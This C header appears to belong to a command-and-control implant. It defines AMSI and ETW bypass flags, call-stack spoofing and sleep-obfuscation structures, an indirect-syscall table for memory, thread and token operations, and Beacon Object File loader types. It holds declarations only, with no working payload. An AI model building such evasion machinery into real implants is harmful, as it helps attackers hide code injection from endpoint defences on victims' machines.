#ifndef EVASION_H
#define EVASION_H

#define DOTNET_BYPASS_NONE 0x000
#define DOTNET_BYPASS_EXIT 0x200
#define DOTNET_BYPASS_ALL  0x100
#define DOTNET_BYPASS_ETW  0x400
#define DOTNET_BYPASS_AMSI 0x700

/* =========== [ Spoof ] ========= */

struct _FRAME_INFO {
    UPTR Ptr;  // pointer to function + offset
    UPTR Size; // stack size
};
typedef _FRAME_INFO FRAME_INFO;

struct _GADGET_INFO {
    UPTR Ptr;  // pointer to gadget
    UPTR Size; // stack size
};
typedef _GADGET_INFO GADGET_INFO;

struct _STACK_FRAME {
    WCHAR* DllPath;
    ULONG  Offset;
    ULONG  TotalSize;
    BOOL   ReqLoadLib;
    BOOL   SetsFramePtr;
    PVOID  ReturnAddress;
    BOOL   PushRbp;
    ULONG  CountOfCodes;
    BOOL   PushRbpIdx;
};
typedef _STACK_FRAME STACK_FRAME;

#define OBF_JMP( i, p ) \
    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {   \
        Ctx[i].Rax = (U_PTR)( p );                 \
    } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) { \
        Ctx[i].Rbx = (U_PTR)( & p );               \
    } else {                                       \
        Ctx[i].Rip = (U_PTR)( p );                 \
    }

/* ======== [ Syscalls ] ======== */

#define SY_SEED   0xEDB88320
#define SY_UP     -12
#define SY_DOWN   12
#define SY_RANGE  0xE5

typedef enum Sys {
    Alloc,
    Protect,
    Write,
    Read,
    Free,
    CrThread,
    QueueApc,
    OpenThrd,
    OpenProc,
    MapView,
    CrSectn,
    OpenPrToken,
    OpenThToken,
    SetCtxThrd,
    GetCtxThrd,
    Last
};

typedef struct {
    ULONG ssn;
    ULONG Hash;
    UPTR  Address;
    UPTR  Instruction;
} EXT, *PEXT;

enum eMask {
    Timer = 1,
    Pooling,
    None
};

enum Reg {
    eRax,
    eRsi,
    eRbx = 0x23
};

/* ========= [ Coff ] ========= */

#define COFF_VAR 0x10
#define COFF_FNC 0x20
#define COFF_IMP 0x30

#define CALLBACK_OUTPUT      0x0
#define CALLBACK_OUTPUT_OEM  0x1e
#define CALLBACK_OUTPUT_UTF8 0x20
#define CALLBACK_ERROR       0x0d
#define CALLBACK_NO_PRE_MSG  0x4f
#define CALLBACK_CUSTOM      0x1000
#define CALLBACK_CUSTOM_LAST 0x13ff
#define CALLBACK_AX_SCREENSHOT   0x81
#define CALLBACK_AX_DOWNLOAD_MEM 0x82

struct _BOF_OBJ {
    PVOID MmBegin;
    PVOID MmEnd;
    CHAR* UUID;
    ULONG CmdID;
    PVOID Entry;

    struct _BOF_OBJ* Next;
};
typedef _BOF_OBJ BOF_OBJ;

struct _DATA_STORE {
    INT32  Type;
    UINT64 Hash;
    BOOL   Masked;
    CHAR*  Buffer;
    SIZE_T Length;
};
typedef _DATA_STORE DATA_STORE;

#define DATA_STORE_TYPE_EMPTY        0
#define DATA_STORE_TYPE_GENERAL_FILE 1
#define DATA_STORE_TYPE_DOTNET       2
#define DATA_STORE_TYPE_PE           3
#define DATA_STORE_TYPE_BOF          4

struct _USER_DATA {
    CHAR*  Key;
    PVOID  Ptr;
    struct _USER_DATA* Next;
};
typedef _USER_DATA VALUE_DICT;

typedef struct {
    PVOID Base;
    ULONG Size;
} SECTION_DATA;

typedef struct {
    PCHAR Name;
    ULONG Hash;
    UINT8 Type; // ( COFF_VAR | COFF_FNC | COFF_IMP )
    ULONG Rva;
    PVOID Ptr;
    INT16 SectionNumber;
} SYMBOL_DATA;

typedef struct {
    SYMBOL_DATA*  Sym;
    SECTION_DATA* Sec;
} COFF_DATA;

typedef struct _COFF_MAPPED {
    PVOID       MmBase;
    ULONG       MmSize;
    PVOID       EntryPoint;
    COFF_DATA   CoffData;
    ULONG       SecNbrs;
    ULONG       SymNbrs;
    BOOL        IsObfuscated;      // tracks obfuscation state
    PVOID*      ExecSections;      // array of executable section bases
    ULONG*      ExecSizes;         // array of executable section sizes
    ULONG       ExecCount;         // number of executable sections
} COFF_MAPPED, *PCOFF_MAPPED;


#define POSTEX_LIST_HANDLE      "\x66\x55\x44\x77"
#define POSTEX_COUNT_HANDLE     "\x77\x44\x55\x66"

#endif // EVASION_H